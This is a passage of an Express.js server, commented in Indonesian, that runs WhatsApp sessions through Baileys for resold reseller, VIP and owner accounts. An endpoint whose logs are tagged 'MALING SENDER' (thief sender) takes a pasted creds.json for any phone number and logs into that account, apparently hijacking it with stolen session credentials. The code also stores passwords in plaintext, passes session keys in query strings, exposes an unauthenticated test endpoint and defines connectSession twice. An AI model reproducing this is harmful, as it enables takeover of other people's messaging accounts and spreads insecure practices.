app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  
  if (!keyInfo) {
    logDebug(`[mySender] Invalid key: ${key}`);
    return res.status(401).json({ error: "Invalid session key" });
  }

  const db = loadDatabaseCached();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    logDebug(`[mySender] User not found: ${keyInfo.username}`);
    return res.status(401).json({ error: "User not found" });
  }

  logDebug(`[mySender] Checking senders for user: ${user.username}`);

  // ===== BUILD CONNECTIONS LIST =====
  const connections = [];
  
  // ===== SENDER PRIBADI =====
  let activePersonalCount = 0;
  let totalPersonalCount = 0;
  const userFolder = path.join('permenmd', user.username);
  
  if (fs.existsSync(userFolder)) {
    const jsonFiles = fs.readdirSync(userFolder).filter(file => file.endsWith('.json') && !file.includes('_info'));
    totalPersonalCount = jsonFiles.length;
    logDebug(`[mySender] Personal folder: ${userFolder}, total files: ${totalPersonalCount}`);
    
    for (const file of jsonFiles) {
      const sessionName = path.basename(file, '.json');
      const isActive = activeConnections[sessionName] ? true : false;
      
      if (isActive) {
        activePersonalCount++;
      }
      
      // Tambahkan ke connections list dengan format yang diharapkan Flutter
      connections.push({
        id: sessionName,
        sessionName: sessionName,
        phone: sessionName,
        connected: isActive,
        type: 'Personal',
        folder: user.username,
        status: isActive ? 'CONNECTED' : 'DISCONNECTED'
      });
      
      logDebug(`[mySender] Personal ${isActive ? 'ACTIVE' : 'INACTIVE'}: ${sessionName}`);
      
      // Coba reconnect jika tidak aktif
      if (!isActive) {
        const sessionFolder = path.join(userFolder, sessionName);
        if (fs.existsSync(sessionFolder)) {
          connectSession(userFolder, sessionName).catch(e => {
            logDebug(`[mySender] Reconnect failed for ${sessionName}: ${e.message}`);
          });
        }
      }
    }
  } else {
    logDebug(`[mySender] Personal folder not found: ${userFolder}`);
    fs.mkdirSync(userFolder, { recursive: true });
  }
  
  // ===== SENDER GLOBAL =====
  let activeGlobalCount = 0;
  let totalGlobalCount = 0;
  const globalFolder = path.join('permenmd', 'global');
  
  if (fs.existsSync(globalFolder)) {
    const jsonFiles = fs.readdirSync(globalFolder).filter(file => file.endsWith('.json') && !file.includes('_info'));
    totalGlobalCount = jsonFiles.length;
    
    for (const file of jsonFiles) {
      const sessionName = path.basename(file, '.json');
      const isActive = activeConnections[sessionName] ? true : false;
      
      if (isActive) {
        activeGlobalCount++;
      }
      
      // Tambahkan ke connections list dengan folder 'global'
      connections.push({
        id: sessionName,
        sessionName: sessionName,
        phone: sessionName,
        connected: isActive,
        type: 'Global',
        folder: 'global',
        status: isActive ? 'CONNECTED' : 'DISCONNECTED'
      });
      
      logDebug(`[mySender] Global ${isActive ? 'ACTIVE' : 'INACTIVE'}: ${sessionName}`);
      
      if (!isActive) {
        const sessionFolder = path.join(globalFolder, sessionName);
        if (fs.existsSync(sessionFolder)) {
          connectSession(globalFolder, sessionName).catch(e => {
            logDebug(`[mySender] Reconnect global failed for ${sessionName}: ${e.message}`);
          });
        }
      }
    }
  }

  logDebug(`[mySender] RESULT for ${user.username}: Personal ${activePersonalCount}/${totalPersonalCount}, Global ${activeGlobalCount}/${totalGlobalCount}, Total connections: ${connections.length}`);

  return res.json({
    valid: true,
    personalCount: activePersonalCount,
    globalCount: activeGlobalCount,
    totalPersonal: totalPersonalCount,
    totalGlobal: totalGlobalCount,
    username: user.username,
    role: user.role,
    connections: connections  // <-- KUNCI: Tambahkan field connections
  });
});

// Fungsi debug untuk mengecek struktur folder permenmd
function debugFolderStructure() {
    const permenmdFolder = path.join(__dirname, 'permenmd');
    
    if (!fs.existsSync(permenmdFolder)) {
        logInfo("📁 Folder permenmd tidak ditemukan!");
        return;
    }
    
    logInfo("========== FOLDER STRUCTURE DEBUG ==========");
    
    const items = fs.readdirSync(permenmdFolder);
    
    for (const item of items) {
        const itemPath = path.join(permenmdFolder, item);
        const stat = fs.lstatSync(itemPath);
        
        if (stat.isDirectory()) {
            logInfo(`📁 Folder: ${item}/`);
            
            // Cek isi folder
            const files = fs.readdirSync(itemPath);
            const jsonFiles = files.filter(f => f.endsWith('.json'));
            const subFolders = files.filter(f => {
                const subPath = path.join(itemPath, f);
                return fs.lstatSync(subPath).isDirectory();
            });
            
            logInfo(`   📄 JSON files: ${jsonFiles.length}`);
            for (const jf of jsonFiles) {
                logInfo(`      - ${jf}`);
            }
            
            logInfo(`   📂 Subfolders: ${subFolders.length}`);
            for (const sf of subFolders) {
                logInfo(`      - ${sf}/`);
            }
        }
    }
    
    logInfo("========== ACTIVE CONNECTIONS ==========");
    for (const [name, sock] of Object.entries(activeConnections)) {
        logInfo(`   ✅ ${name} - ${sock ? 'Connected' : 'Disconnected'}`);
    }
    
    logInfo("=========================================");
}

// Panggil debug saat startup
setTimeout(() => {
    debugFolderStructure();
}, 3000);

// Endpoint untuk cek koneksi sender dari text creds.json
app.post("/api/check-sender-connection", async (req, res) => {
  const { sessionKey, creds, phoneNumber } = req.body;
  
  // Validasi session
  const keyInfo = activeKeys[sessionKey];
  if (!keyInfo) {
    return res.status(401).json({ 
      success: false, 
      message: "Session key tidak valid" 
    });
  }

  const db = loadDatabaseCached();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.status(403).json({ 
      success: false, 
      message: "User tidak ditemukan" 
    });
  }

  try {
    // Validasi creds
    if (!creds || !creds.me || !creds.me.id) {
      return res.json({ 
        success: false, 
        message: "Format creds.json tidak valid" 
      });
    }

    logDebug(`[📱 MALING SENDER] ${user.username} mencoba menambahkan sender ${phoneNumber}`);

    // Buat folder untuk user
    const userDir = path.join('permenmd', user.username);
    const sessionDir = path.join(userDir, phoneNumber);
    
    // Buat folder session
    fs.mkdirSync(sessionDir, { recursive: true });

    // Simpan creds.json di folder session
    const credsPath = path.join(sessionDir, 'creds.json');
    fs.writeFileSync(credsPath, JSON.stringify(creds, null, 2));

    // ===== PENTING: Simpan file JSON di folder user (bukan di root) =====
    const userCredsPath = path.join(userDir, `${phoneNumber}.json`);
    fs.writeFileSync(userCredsPath, JSON.stringify(creds, null, 2));
    logDebug(`[💾 MALING SENDER] Saved creds to user folder: ${userCredsPath}`);

    // Coba konek ke WhatsApp
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      auth: state,
      version,
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      markOnlineOnConnect: true,
      generateHighQualityLinkPreview: true,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 50000,
      syncFullHistory: false
    });

    sock.ev.on("creds.update", saveCreds);

    // Promise untuk menunggu koneksi
    const connectionResult = await new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        reject(new Error("Timeout: Tidak bisa connect ke WhatsApp"));
      }, 30000);

      sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) {
          reject(new Error("Session tidak valid (meminta QR)"));
        }

        if (connection === "open") {
          clearTimeout(timeout);
          
          // Simpan ke activeConnections
          activeConnections[phoneNumber] = sock;
          
          // Tentukan tipe
          const type = detectWATypeFromCreds(credsPath);
          if (type === "Business") {
            biz[phoneNumber] = sock;
          } else {
            mess[phoneNumber] = sock;
          }

          resolve({
            success: true,
            type: type,
            phoneNumber: phoneNumber,
            name: creds.me?.name || 'Unknown'
          });
        }

        if (connection === "close") {
          clearTimeout(timeout);
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          
          if (statusCode === DisconnectReason.loggedOut) {
            reject(new Error("Session sudah logout"));
          } else {
            reject(new Error(`Koneksi terputus (${statusCode || 'unknown'})`));
          }
        }
      });
    });

    logDebug(`[🎉 MALING SENDER] SUCCESS! ${phoneNumber} (${connectionResult.name}) added to ${user.username}`);

    return res.json({
      success: true,
      message: "Koneksi berhasil",
      phoneNumber: phoneNumber,
      name: connectionResult.name,
      type: connectionResult.type
    });

  } catch (error) {
    logError("[❌ MALING SENDER ERROR]", error.message);
    
    // Bersihkan folder jika gagal
    try {
      const userDir = path.join('permenmd', user.username);
      const sessionDir = path.join(userDir, phoneNumber);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }
      
      // Hapus juga file JSON di folder user
      const userCredsPath = path.join(userDir, `${phoneNumber}.json`);
      if (fs.existsSync(userCredsPath)) {
        fs.unlinkSync(userCredsPath);
      }
    } catch (e) {}

    return res.json({
      success: false,
      message: error.message
    });
  }
});

// Get Pairing
app.get("/getPairing", async (req, res) => {
const { key, number } = req.query;
const keyInfo = activeKeys[key];
if (!keyInfo) {
logDebug("[❌ BUG] Key tidak valid.");
return res.json({ valid: false });
}

const db = loadDatabaseCached();
const user = db.find(u => u.username === keyInfo.username);
if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

if (!number) return res.status(400).json({ error: "Number is required" });

try {
const sessionDir = path.join('permenmd', user.username, number);

if (!fs.existsSync(`permenmd/${user.username}`)) fs.mkdirSync(`permenmd/${user.username}`);  
if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);  

const { state, saveCreds } = await useMultiFileAuthState(sessionDir);  
const { version } = await fetchLatestBaileysVersion();  

const sock = makeWASocket({  
  keepAliveIntervalMs: 50000,  
  logger: pino({ level: "silent" }),  
  auth: state,  
  syncFullHistory: true,  
  markOnlineOnConnect: true,  
  connectTimeoutMs: 60000,  
  defaultQueryTimeoutMs: 0,  
  generateHighQualityLinkPreview: true,  
  browser: ["Ubuntu", "Chrome", "20.0.04"],  
  version  
});  

sock.ev.on("creds.update", saveCreds);  

sock.ev.on("connection.update", async (update) => {  
  const { connection, lastDisconnect } = update;  

  if (connection === "close") {  
    const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;  
    if (!isLoggedOut) {  
      logDebug(`🔄 Reconnecting ${number}...`);  
      await sleep(3000);  
      await pairingWa(number, user.username);  
    } else {  
      delete activeConnections[number];  
    }  
  }  
});  

if (!sock.authState.creds.registered) {  
  await sleep(1000);  
  let code = await sock.requestPairingCode(number);  
  logDebug(code)  
  if (code) {  
    return res.json({ valid: true, number, pairingCode: code });  
  } else {  
    return res.json({ valid: false, message: "Already registered or failed to get code" });  
  }  
}

} catch (err) {
return res.status(500).json({ error: err.message });
}
});

// Create Account
app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  logDebug(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    logDebug("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabaseCached();
  const creator = db.find(u => u.username === keyInfo.username);

  // MODIFIED: Tambahkan role "vip" ke daftar yang diizinkan
  if (!creator || !["reseller", "owner", "reseller1", "vip"].includes(creator.role)) {
    logDebug(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  // MODIFIED: Reseller dan reseller1 tetap dibatasi 30 hari
  // Owner dan VIP tidak dibatasi
  if ((creator.role === "reseller" || creator.role === "reseller1") && parseInt(day) > 30) {
    logDebug("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ 
      valid: true, 
      created: false, 
      invalidDay: true, 
      message: "Reseller can only create accounts up to 30 days." 
    });
  }

  if (db.find(u => u.username === newUser)) {
    logDebug("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
  };

  db.push(newAccount);
  saveDatabaseCached(db);
    
  logDebug("[✅ CREATE] Akun berhasil dibuat:", newAccount);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

// Ping endpoint
app.get('/ping', (req, res) => {
  res.send('pong');
});

// List Users
app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  logDebug(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    logDebug("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabaseCached();
  const admin = db.find(u => u.username === keyInfo.username);

  // MODIFIED: Tambahkan role "vip" agar bisa melihat semua user
  if (!admin || (admin.role !== "owner" && admin.role !== "vip")) {
    logDebug(`[❌ LIST] ${admin?.username || "Unknown"} bukan owner atau vip.`);
    return res.json({ 
      valid: true, 
      authorized: false, 
      message: "Only owner and vip can view all users." 
    });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
  }));

  return res.json({ valid: true, authorized: true, users });
});

// ================== CEK ID CHANNEL (STABLE FIX) ==================
app.get("/cekChannel", async (req, res) => {
  const { key, link } = req.query;

  try {

    // ===== VALIDASI SESSION =====
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
      return res.status(401).json({
        success: false,
        message: "Session key tidak valid"
      });
    }

    // ===== VALIDASI USER =====
    const db = loadDatabaseCached();
    const user = db.find(u => u.username === keyInfo.username);

    if (!user) {
      return res.status(403).json({
        success: false,
        message: "User tidak ditemukan"
      });
    }

    // ===== VALIDASI LINK =====
    if (!link) {
      return res.status(400).json({
        success: false,
        message: "Link channel diperlukan"
      });
    }

    if (
      !link.includes("https://whatsapp.com/channel/") &&
      !link.includes("https://www.whatsapp.com/channel/")
    ) {
      return res.status(400).json({
        success: false,
        message: "Format link salah. Gunakan: https://whatsapp.com/channel/INVITE_CODE"
      });
    }

    // ===== AMBIL INVITE CODE =====
    let inviteCode = link
      .replace("https://whatsapp.com/channel/", "")
      .replace("https://www.whatsapp.com/channel/", "")
      .split("?")[0]
      .split("/")[0]
      .trim();

    if (!inviteCode || inviteCode.length < 10) {
      return res.status(400).json({
        success: false,
        message: "Kode invite channel tidak valid"
      });
    }

    logDebug(`[📊 CEK CHANNEL] Invite Code: ${inviteCode}`);

    // ===== AMBIL SOCKET =====
    const sock = await getSocketForUser(user.username);

    if (!sock) {
      return res.status(500).json({
        success: false,
        message: "Session WhatsApp tidak aktif. Silahkan pairing sender."
      });
    }

    // ===== REQUEST METADATA =====
    let metadata;

    try {
      metadata = await sock.newsletterMetadata("invite", inviteCode);
    } catch (err) {

      logError("[❌ BAILEYS METADATA ERROR]", err);

      return res.status(500).json({
        success: false,
        message: "Gagal mengambil metadata channel. Invite mungkin salah atau channel tidak tersedia."
      });

    }

    if (!metadata || typeof metadata !== "object") {
      return res.json({
        success: false,
        message: "Channel tidak ditemukan"
      });
    }

    logDebug(`[CEK CHANNEL] Metadata diterima`);

    // ===== FORMAT DATA =====
    const verified = metadata.verification === "VERIFIED";

    const channelInfo = {
      id: metadata.id || "Tidak diketahui",
      name: metadata.name || "Tidak diketahui",
      description: metadata.description || "Tidak ada deskripsi",
      subscribers: metadata.subscribers || 0,
      state: metadata.state || "Tidak diketahui",
      verification: metadata.verification || "UNKNOWN",
      verified: verified ? "✅" : "❎",
      verifiedText: verified ? "✅ Terverifikasi" : "❎ Tidak Terverifikasi",
      createdAt: metadata.creation_time
        ? new Date(metadata.creation_time * 1000).toLocaleString("id-ID")
        : "Tidak diketahui",
      picture: metadata.picture || null,

      formatted: `
𝑵𝒆𝒘𝒔𝒍𝒆𝒕𝒕𝒆𝒓 𝑰𝒅 : ${metadata.id || "Tidak diketahui"}
𝑵𝒆𝒘𝒔𝒍𝒆𝒕𝒕𝒆𝒓 𝑵𝒂𝒎𝒆 : ${metadata.name || "Tidak diketahui"}
𝑵𝒆𝒘𝒔𝒍𝒆𝒕𝒕𝒆𝒓 𝑭𝒐𝒍𝒍𝒐𝒘𝒆𝒓𝒔 : ${metadata.subscribers || 0}
𝑵𝒆𝒘𝒔𝒍𝒆𝒕𝒕𝒆𝒓 𝑺𝒕𝒂𝒕𝒖𝒔 : ${metadata.state || "Tidak diketahui"}
𝑽𝒆𝒓𝒊𝒗𝒊𝒆𝒅? : ${verified ? "✅" : "❎"}
      `.trim()
    };

    logDebug(`[✅ CEK CHANNEL] ${user.username} cek channel ${channelInfo.name}`);

    return res.json({
      success: true,
      message: "Berhasil mengambil data channel",
      data: channelInfo
    });

  } catch (error) {

    logError("[❌ CEK CHANNEL FATAL ERROR]", error);

    return res.status(500).json({
      success: false,
      message: "Terjadi kesalahan pada server"
    });
  }
});

// Tambahkan di index.js untuk test manual
app.get("/testChannel", async (req, res) => {
  const { code } = req.query;
  
  if (!code) {
    return res.json({ error: "Kode channel diperlukan" });
  }
  
  try {
    // Coba ambil socket pertama yang tersedia
    const socks = Object.values(activeConnections);
    if (socks.length === 0) {
      return res.json({ error: "Tidak ada socket aktif" });
    }
    
    const sock = socks[0];
    const result = await sock.newsletterMetadata("invite", code);
    
    res.json({
      success: true,
      result: result,
      type: typeof result,
      isArray: Array.isArray(result)
    });
  } catch (error) {
    res.json({
      success: false,
      error: error.message,
      stack: error.stack
    });
  }
});

// User Add
app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  logDebug(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabaseCached();
  const creator = db.find(u => u.username === keyInfo.username);

  // MODIFIED: Tambahkan role "vip" agar bisa menambah user dengan role tertentu
  if (!creator || (creator.role !== "owner" && creator.role !== "vip")) {
    logDebug("[❌ USERADD] Tidak diizinkan.");
    return res.json({ 
      valid: true, 
      authorized: false, 
      message: "Only owner and vip can add user with role." 
    });
  }

  if (db.find(u => u.username === username)) {
    logDebug("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: role || "member",
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  saveDatabaseCached(db);
    
  const logLine = `${creator.username} Created ${username} Role ${role} Days ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  logDebug("[✅ USERADD] User berhasil dibuat:", newUser);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

// Edit User
app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  logDebug(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabaseCached();
  const editor = db.find(u => u.username === keyInfo.username);

  // MODIFIED: Tambahkan role "vip" dan "reseller1" ke daftar yang diizinkan
  if (!editor || !["reseller", "owner", "vip", "reseller1"].includes(editor.role)) {
    logDebug("[❌ EDIT] Tidak diizinkan.");
    return res.json({ 
      valid: true, 
      authorized: false, 
      message: "Only reseller, owner, and vip can edit user." 
    });
  }

  // MODIFIED: Reseller dan reseller1 dibatasi 30 hari
  // Owner dan VIP tidak dibatasi
  if ((editor.role === "reseller" || editor.role === "reseller1") && parseInt(addDays) > 30) {
    logDebug("[❌ EDIT] Reseller tidak boleh menambah masa aktif lebih dari 30 hari.");
    return res.json({ 
      valid: true, 
      edited: false, 
      invalidDay: true, 
      message: "Reseller can only extend accounts up to 30 days." 
    });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    logDebug("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // MODIFIED: Reseller dan reseller1 hanya bisa mengedit user dengan role 'member'
  // Owner dan VIP bisa mengedit semua role
  if ((editor.role === "reseller" || editor.role === "reseller1") && targetUser.role !== "member") {
    logDebug("[❌ EDIT] Reseller hanya bisa mengedit user dengan role 'member'.");
    return res.json({ 
      valid: true, 
      edited: false, 
      message: "Reseller hanya bisa mengedit user dengan role 'member'." 
    });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabaseCached(db);
  const logLine = `${editor.username} Edited ${username} Add Days ${addDays}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  logDebug("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

// Get Log
app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabaseCached();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

// WhatsApp Connection Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

const activeConnections = {};
const biz = {};
const mess = {};

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      logDebug("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      logError("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    logError("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = path.join(folderPath, sessionName);
      
      // Pastikan folder session ada
      if (!fs.existsSync(sessionsFold)) {
        fs.mkdirSync(sessionsFold, { recursive: true });
      }
      
      const { state, saveCreds } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        keepAliveIntervalMs: 50000,
        logger: pino({ level: "silent" }),
        auth: state,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        generateHighQualityLinkPreview: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        version
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(path.join(sessionsFold, 'creds.json'));
          const folderType = path.basename(folderPath);
          logDebug(`\n[${sessionName}] Connected. Type: ${type} (Folder: ${folderType})`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }
          
          // ===== PENTING: Simpan creds ke file JSON di folder utama =====
          try {
            const sourceCreds = path.join(sessionsFold, 'creds.json');
            const destCreds = path.join(folderPath, `${sessionName}.json`);
            
            if (fs.existsSync(sourceCreds) && !fs.existsSync(destCreds)) {
              const credsData = JSON.parse(fs.readFileSync(sourceCreds, 'utf8'));
              fs.writeFileSync(destCreds, JSON.stringify(credsData, null, 2));
              logDebug(`[${sessionName}] Creds saved to: ${destCreds}`);
            }
          } catch (e) {
            logError(`[${sessionName}] Error saving creds: ${e.message}`);
          }

          resolve();
        } else if (connection === "close") {
          logDebug(`\n[${sessionName}] Connection closed. Status: ${statusCode} (Folder: ${path.basename(folderPath)})`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(sessionsFold, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await sleep(3000);
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            logDebug(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(sessionsFold, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      logDebug(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      logDebug(`[${sessionName}] Disconnected.`);
    } catch (e) {
      logDebug(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  logDebug('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  logDebug(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    if (activeConnections[baseName]) {
      logDebug(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    connectSession(sessionFolder, baseName);
  }
}

async function refreshUserSessions() {
  await startUserSessions();
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        keepAliveIntervalMs: 50000,
        logger: pino({ level: "silent" }),
        auth: state,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        generateHighQualityLinkPreview: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        version
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          logDebug(`\n[${sessionName}] Connected. Type: ${type} (Folder: ${path.basename(folderPath)})`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          logDebug(`\n[${sessionName}] Connection closed. Status: ${statusCode} (Folder: ${path.basename(folderPath)})`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await sleep(3000);
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            logDebug(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      logDebug(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      resolve();
    }
  });
}

// ================== FUNGSI PAIRING UNTUK GLOBAL SENDER SAJA ==================
async function pairingGlobal(number, attempt = 1) {
  if (attempt >= 5) {
    logDebug(`[PAIRING GLOBAL] Gagal setelah 5 percobaan untuk +${number}`);
    return false;
  }
  
  const globalFolder = path.join('permenmd', 'global');
  const sessionDir = path.join(globalFolder, number);
  const credsFile = path.join(globalFolder, `${number}.json`);

  // Buat folder jika belum ada
  if (!fs.existsSync('permenmd')) {
    fs.mkdirSync('permenmd', { recursive: true });
  }
  if (!fs.existsSync(globalFolder)) {
    fs.mkdirSync(globalFolder, { recursive: true });
  }
  if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
  }

  try {
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    });

    sock.ev.on("creds.update", saveCreds);

    // Promise untuk mendapatkan pairing code
    const pairingCodePromise = new Promise(async (resolve, reject) => {
      const timeout = setTimeout(() => {
        reject(new Error("Timeout waiting for pairing code"));
      }, 60000);

      try {
        if (!sock.authState.creds.registered) {
          await sleep(2000);
          const code = await sock.requestPairingCode(number);
          clearTimeout(timeout);
          
          if (code) {
            let cleanCode = code.replace(/[^0-9]/g, '');
            let formattedCode = cleanCode;
            if (cleanCode.length === 8) {
              formattedCode = `${cleanCode.slice(0,4)}-${cleanCode.slice(4,8)}`;
            } else if (cleanCode.length > 8) {
              formattedCode = `${cleanCode.slice(0,4)}-${cleanCode.slice(4,8)}`;
            }
            resolve({ code: formattedCode, rawCode: code });
          } else {
            reject(new Error("Failed to get pairing code"));
          }
        } else {
